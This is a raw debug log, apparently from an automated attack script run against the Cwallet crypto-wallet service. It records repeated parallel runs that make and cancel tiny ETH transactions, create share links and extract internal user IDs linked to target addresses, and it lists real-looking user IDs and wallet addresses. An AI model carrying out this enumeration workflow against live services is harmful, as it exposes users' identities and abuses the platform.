2026-03-06 23:57:03,047 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-07 00:01:22,001 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-07 00:01:22,111 | DEBUG | attack | Transaction canceled successfully
2026-03-07 00:01:22,114 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-07 00:01:22,248 | DEBUG | attack | Extracted userId: 35425754
2026-03-07 00:01:22,261 | DEBUG | attack | Starting executeFullTransaction
2026-03-07 00:01:22,261 | DEBUG | attack | Target address: 0x9fe67293e104129392e3525d1d513279719ec2d3 | Amount: 0.00000001 | Coin: ETH
2026-03-07 00:01:22,261 | DEBUG | attack | Step 1: Checking internal address
2026-03-07 00:01:22,991 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-07 00:01:23,114 | DEBUG | attack | Address confirmed as internal
2026-03-07 00:01:23,169 | DEBUG | attack | Extracted userId: 35425754
2026-03-07 00:01:23,170 | DEBUG | attack | Starting executeFullTransaction
2026-03-07 00:01:23,170 | DEBUG | attack | Target address: 0xfa145338aed0bfec86deb115da307232d8abe4d7 | Amount: 0.00000001 | Coin: ETH
2026-03-07 00:01:23,171 | DEBUG | attack | Step 1: Checking internal address
2026-03-07 00:01:23,364 | DEBUG | attack | Share link created: https://s.cwallet.com/10ma2pg
2026-03-07 00:01:23,364 | DEBUG | attack | Step 6: Canceling transaction
2026-03-07 00:01:23,479 | DEBUG | attack | Share link created: https://s.cwallet.com/175bmag
2026-03-07 00:01:23,479 | DEBUG | attack | Step 6: Canceling transaction
2026-03-07 00:01:23,562 | DEBUG | attack | Transaction result: {'bill_id': '202603062201382030041138046992384', 'type': 3}
2026-03-07 00:01:23,563 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-07 00:01:23,645 | DEBUG | attack | Share link created: https://s.cwallet.com/1930kp0
2026-03-07 00:01:23,645 | DEBUG | attack | Step 6: Canceling transaction
2026-03-07 00:01:23,729 | DEBUG | attack | Transaction canceled successfully
2026-03-07 00:01:23,730 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-07 00:01:23,966 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-07 00:01:24,499 | DEBUG | attack | Address confirmed as internal
2026-03-07 00:01:24,526 | DEBUG | attack | Generated billId: 202603062201412030041150848008192
2026-03-07 00:01:24,526 | DEBUG | attack | Step 3: Making transaction
2026-03-07 00:01:24,640 | DEBUG | attack | Transaction ID: 202603062201392030041144822489088
2026-03-07 00:01:24,642 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-07 00:01:24,738 | DEBUG | attack | Extracted userId: 43674140
2026-03-07 00:01:24,740 | DEBUG | attack | Starting executeFullTransaction
2026-03-07 00:01:24,740 | DEBUG | attack | Target address: 0x4cabc200b4020497d8443324a0432d8043cf27af | Amount: 0.00000001 | Coin: ETH
2026-03-07 00:01:24,740 | DEBUG | attack | Step 1: Checking internal address
2026-03-07 00:01:24,869 | DEBUG | attack | Generated billId: 202603062201412030041151930138624
2026-03-07 00:01:24,870 | DEBUG | attack | Step 3: Making transaction
2026-03-07 00:01:24,995 | DEBUG | attack | Transaction canceled successfully
2026-03-07 00:01:24,999 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-07 00:01:25,098 | DEBUG | attack | Transaction canceled successfully
2026-03-07 00:01:25,099 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-07 00:01:25,201 | DEBUG | attack | Transaction canceled successfully
2026-03-07 00:01:25,202 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-07 00:01:25,738 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-07 00:01:25,850 | DEBUG | attack | Address confirmed as internal
2026-03-07 00:01:25,929 | DEBUG | attack | Extracted userId: 59182
2026-03-07 00:01:25,931 | DEBUG | attack | Extracted userId: 54560423
2026-03-07 00:01:25,931 | DEBUG | attack | Starting executeFullTransaction
2026-03-07 00:01:25,931 | DEBUG | attack | Target address: 0x63ecb38fd29a6d9c672ed1c82275284b4dff6ea8 | Amount: 0.00000001 | Coin: ETH
2026-03-07 00:01:25,931 | DEBUG | attack | Step 1: Checking internal address
2026-03-07 00:01:26,033 | DEBUG | attack | Starting executeFullTransaction
2026-03-07 00:01:26,034 | DEBUG | attack | Target address: 0xfc93d535a174396a616d770975c757f0456b0363 | Amount: 0.00000001 | Coin: ETH
2026-03-07 00:01:26,034 | DEBUG | attack | Step 1: Checking internal address
2026-03-07 00:01:26,151 | DEBUG | attack | Share link created: https://s.cwallet.com/y37fb3
2026-03-07 00:01:26,155 | DEBUG | attack | Step 6: Canceling transaction
2026-03-07 00:01:26,260 | DEBUG | attack | Extracted userId: 33078099
2026-03-07 00:01:26,264 | DEBUG | attack | Starting executeFullTransaction
2026-03-07 00:01:26,264 | DEBUG | attack | Target address: 0x676959e95e0c07cc954687c66212c9d00b41a6a4 | Amount: 0.00000001 | Coin: ETH
2026-03-07 00:01:26,264 | DEBUG | attack | Step 1: Checking internal address
2026-03-07 00:01:26,397 | DEBUG | attack | Transaction result: {'bill_id': '202603062201412030041150848008192', 'type': 3}
2026-03-07 00:01:26,398 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-07 00:01:26,512 | DEBUG | attack | Transaction result: {'bill_id': '202603062201412030041151930138624', 'type': 3}
2026-03-07 00:01:26,512 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-07 00:01:26,972 | DEBUG | attack | Generated billId: 202603062201432030041161367322624
2026-03-07 00:01:26,974 | DEBUG | attack | Step 3: Making transaction
2026-03-07 00:01:27,226 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-07 00:01:27,344 | DEBUG | attack | Address confirmed as internal
2026-03-07 00:01:27,348 | DEBUG | attack | Address confirmed as internal
2026-03-07 00:01:27,351 | DEBUG | attack | Address confirmed as internal
2026-03-07 00:01:27,353 | DEBUG | attack | Transaction ID: 202603062201422030041157422182400
2026-03-07 00:01:27,354 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-07 00:01:27,466 | DEBUG | attack | Transaction ID: 202603062201422030041157019529216
2026-03-07 00:01:27,467 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-07 00:01:27,568 | DEBUG | attack | Transaction canceled successfully
2026-03-07 00:01:27,569 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-07 00:01:28,303 | DEBUG | attack | Generated billId: 202603062201452030041166685700096
2026-03-07 00:01:28,303 | DEBUG | attack | Step 3: Making transaction
2026-03-07 00:01:28,417 | DEBUG | attack | Share link created: https://s.cwallet.com/1ad5va6
2026-03-07 00:01:28,419 | DEBUG | attack | Step 6: Canceling transaction
2026-03-07 00:01:28,517 | DEBUG | attack | Transaction result: {'bill_id': '202603062201432030041161367322624', 'type': 3}
2026-03-07 00:01:28,518 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-07 00:01:28,614 | DEBUG | attack | Share link created: https://s.cwallet.com/1cmac7f
2026-03-07 00:01:28,615 | DEBUG | attack | Step 6: Canceling transaction
2026-03-07 00:01:28,706 | DEBUG | attack | Extracted userId: 34657495
2026-03-07 00:01:28,711 | DEBUG | attack | Starting executeFullTransaction
2026-03-07 00:01:28,711 | DEBUG | attack | Target address: 0xbcf45c2ef1ed2b543a5fe738bea877e526ab6efe | Amount: 0.00000001 | Coin: ETH
2026-03-07 00:01:28,713 | DEBUG | attack | Step 1: Checking internal address
2026-03-07 00:01:28,825 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-07 00:01:29,545 | DEBUG | attack | Address confirmed as internal
2026-03-07 00:01:29,557 | DEBUG | attack | Transaction ID: 202603062201442030041165991141376
2026-03-07 00:01:29,558 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-07 00:01:29,651 | DEBUG | attack | Generated billId: 202603062201462030041172234764288
2026-03-07 00:01:29,652 | DEBUG | attack | Step 3: Making transaction
2026-03-07 00:01:29,756 | DEBUG | attack | Transaction result: {'bill_id': '202603062201452030041166685700096', 'type': 3}
2026-03-07 00:01:29,757 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-07 00:01:29,845 | DEBUG | attack | Transaction canceled successfully
2026-03-07 00:01:29,847 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-07 00:01:29,939 | DEBUG | attack | Transaction canceled successfully
2026-03-07 00:01:29,940 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-07 00:01:30,094 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-07 00:01:30,293 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-07 00:01:30,397 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-07 00:01:30,856 | DEBUG | attack | Transaction ID: 202603062201462030041171913498624
2026-03-07 00:01:30,857 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-07 00:01:30,972 | DEBUG | attack | Extracted userId: 55684465
2026-03-07 00:01:30,976 | DEBUG | attack | Extracted userId: 633669
2026-03-07 00:01:30,979 | DEBUG | attack | Share link created: https://s.cwallet.com/yyylss
2026-03-07 00:01:30,980 | DEBUG | attack | Step 6: Canceling transaction
2026-03-07 00:01:31,095 | DEBUG | attack | Starting executeFullTransaction
2026-03-07 00:01:31,096 | DEBUG | attack | Target address: 0x9c56ec88a888c1377aae860ccfbf69307837e5fa | Amount: 0.00000001 | Coin: ETH
2026-03-07 00:01:31,096 | DEBUG | attack | Step 1: Checking internal address
2026-03-07 00:01:31,214 | DEBUG | attack | Generated billId: 202603062201472030041178358448128
2026-03-07 00:01:31,215 | DEBUG | attack | Step 3: Making transaction
2026-03-07 00:01:31,308 | DEBUG | attack | Starting executeFullTransaction
2026-03-07 00:01:31,308 | DEBUG | attack | Target address: 0x8fbf94207ac5babcfc143f8f84680d80096e2714 | Amount: 0.00000001 | Coin: ETH
2026-03-07 00:01:31,308 | DEBUG | attack | Step 1: Checking internal address
2026-03-07 00:01:31,521 | DEBUG | attack | Transaction result: {'bill_id': '202603062201462030041172234764288', 'type': 3}
2026-03-07 00:01:31,522 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-07 00:01:31,634 | DEBUG | attack | Generated billId: 202603062201482030041178874347520
2026-03-07 00:01:31,635 | DEBUG | attack | Step 3: Making transaction
2026-03-07 00:01:31,727 | DEBUG | attack | Generated billId: 202603062201482030041178903707648
2026-03-07 00:01:31,728 | DEBUG | attack | Step 3: Making transaction
2026-03-07 00:01:32,408 | DEBUG | attack | Address confirmed as internal
2026-03-07 00:01:32,520 | DEBUG | attack | Address confirmed as internal
2026-03-07 00:01:32,525 | DEBUG | attack | Transaction ID: 202603062201472030041177965879296
2026-03-07 00:01:32,527 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-07 00:01:32,647 | DEBUG | attack | Share link created: https://s.cwallet.com/12z25u2
2026-03-07 00:01:32,648 | DEBUG | attack | Step 6: Canceling transaction
2026-03-07 00:01:32,777 | DEBUG | attack | Transaction canceled successfully
2026-03-07 00:01:32,778 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-07 00:01:32,905 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-07 00:01:33,019 | DEBUG | attack | Transaction result: {'bill_id': '202603062201472030041178358448128', 'type': 3}
2026-03-07 00:01:33,019 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-07 00:01:33,142 | DEBUG | attack | Transaction result: {'bill_id': '202603062201482030041178874347520', 'type': 3}
2026-03-07 00:01:33,145 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-07 00:01:33,286 | DEBUG | attack | Transaction result: {'bill_id': '202603062201482030041178903707648', 'type': 3}
2026-03-07 00:01:33,287 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-07 00:01:34,050 | DEBUG | attack | Generated billId: 202603062201502030041191054606336
2026-03-07 00:01:34,052 | DEBUG | attack | Step 3: Making transaction
2026-03-07 00:01:34,171 | DEBUG | attack | Transaction ID: 202603062201492030041184802598912
2026-03-07 00:01:34,172 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-07 00:01:34,277 | DEBUG | attack | Transaction ID: 202603062201492030041184722903040
2026-03-07 00:01:34,278 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-07 00:01:34,380 | DEBUG | attack | Share link created: https://s.cwallet.com/1czrldx
2026-03-07 00:01:34,381 | DEBUG | attack | Step 6: Canceling transaction
2026-03-07 00:01:34,465 | DEBUG | attack | Extracted userId: 57314974
2026-03-07 00:01:34,477 | DEBUG | attack | Transaction ID: 202603062201492030041184785821696
2026-03-07 00:01:34,484 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-07 00:01:34,779 | DEBUG | attack | Starting executeFullTransaction
2026-03-07 00:01:34,808 | DEBUG | attack | Target address: 0x583206bad7e111fb6a323e12ae285e2220848c67 | Amount: 0.00000001 | Coin: ETH
2026-03-07 00:01:34,808 | DEBUG | attack | Step 1: Checking internal address
2026-03-07 00:01:34,908 | DEBUG | attack | Transaction canceled successfully
2026-03-07 00:01:34,908 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-07 00:01:35,027 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-07 00:01:35,130 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-07 00:01:35,839 | DEBUG | attack | Share link created: https://s.cwallet.com/x7ble4
2026-03-07 00:01:35,840 | DEBUG | attack | Step 6: Canceling transaction
2026-03-07 00:01:35,983 | DEBUG | attack | Address confirmed as internal
2026-03-07 00:01:35,985 | DEBUG | attack | Extracted userId: 48216915
2026-03-07 00:01:35,987 | DEBUG | attack | Generated billId: 202603062201522030041198801485824
2026-03-07 00:01:35,987 | DEBUG | attack | Step 3: Making transaction
2026-03-07 00:01:36,302 | DEBUG | attack | Generated billId: 202603062201522030041198805680128
2026-03-07 00:01:36,302 | DEBUG | attack | Step 3: Making transaction
2026-03-07 00:01:36,508 | DEBUG | attack | Transaction canceled successfully
2026-03-07 00:01:36,509 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-07 00:01:36,599 | DEBUG | attack | Starting executeFullTransaction
2026-03-07 00:01:36,600 | DEBUG | attack | Target address: 0x844eaa420840f18266e3217fa248be5dc5380654 | Amount: 0.00000001 | Coin: ETH
2026-03-07 00:01:36,600 | DEBUG | attack | Step 1: Checking internal address
2026-03-07 00:01:36,773 | DEBUG | attack | Transaction result: {'bill_id': '202603062201502030041191054606336', 'type': 3}
2026-03-07 00:01:36,775 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-07 00:01:36,912 | DEBUG | attack | Share link created: https://s.cwallet.com/18m036w
2026-03-07 00:01:36,914 | DEBUG | attack | Step 6: Canceling transaction
2026-03-07 00:01:37,022 | DEBUG | attack | Share link created: https://s.cwallet.com/zl8085
2026-03-07 00:01:37,023 | DEBUG | attack | Step 6: Canceling transaction
2026-03-07 00:01:37,820 | DEBUG | attack | Extracted userId: 27481689
2026-03-07 00:01:37,822 | DEBUG | attack | Address confirmed as internal
2026-03-07 00:01:37,823 | DEBUG | attack | Starting executeFullTransaction
2026-03-07 00:01:37,823 | DEBUG | attack | Target address: 0x7141c657c5de31d188a2191662b966c3ae9264f9 | Amount: 0.00000001 | Coin: ETH
2026-03-07 00:01:37,823 | DEBUG | attack | Step 1: Checking internal address
2026-03-07 00:01:37,946 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-07 00:01:38,135 | DEBUG | attack | Transaction ID: 202603062201522030041198576689152
2026-03-07 00:01:38,136 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-07 00:01:38,285 | DEBUG | attack | Transaction canceled successfully
2026-03-07 00:01:38,298 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-07 00:01:38,395 | DEBUG | attack | Transaction result: {'bill_id': '202603062201522030041198801485824', 'type': 3}
2026-03-07 00:01:38,398 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-07 00:01:38,517 | DEBUG | attack | Transaction canceled successfully
2026-03-07 00:01:38,520 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-07 00:01:38,629 | DEBUG | attack | Transaction result: {'bill_id': '202603062201522030041198805680128', 'type': 3}
2026-03-07 00:01:38,629 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-07 00:01:38,716 | DEBUG | attack | Transaction canceled successfully
2026-03-07 00:01:38,717 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-07 00:01:39,413 | DEBUG | attack | Generated billId: 202603062201562030041213557047296
2026-03-07 00:01:39,414 | DEBUG | attack | Step 3: Making transaction
2026-03-07 00:01:39,569 | DEBUG | attack | Address confirmed as internal
2026-03-07 00:01:39,572 | DEBUG | attack | Transaction ID: 202603062201542030041206805913600
2026-03-07 00:01:39,575 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-07 00:01:39,693 | DEBUG | attack | Extracted userId: 57259582
2026-03-07 00:01:39,699 | DEBUG | attack | Extracted userId: 58161713
2026-03-07 00:01:39,701 | DEBUG | attack | Transaction ID: 202603062201542030041206998855680
2026-03-07 00:01:39,702 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-07 00:01:39,896 | DEBUG | attack | Extracted userId: 56876117
2026-03-07 00:01:39,900 | DEBUG | attack | Share link created: https://s.cwallet.com/xao3xf
2026-03-07 00:01:39,902 | DEBUG | attack | Step 6: Canceling transaction
2026-03-07 00:01:40,278 | DEBUG | attack | Starting executeFullTransaction
2026-03-07 00:01:40,281 | DEBUG | attack | Target address: 0x8cd7cbf233fa49f9fa7bb1a81b9939bb5bd7ae95 | Amount: 0.00000001 | Coin: ETH
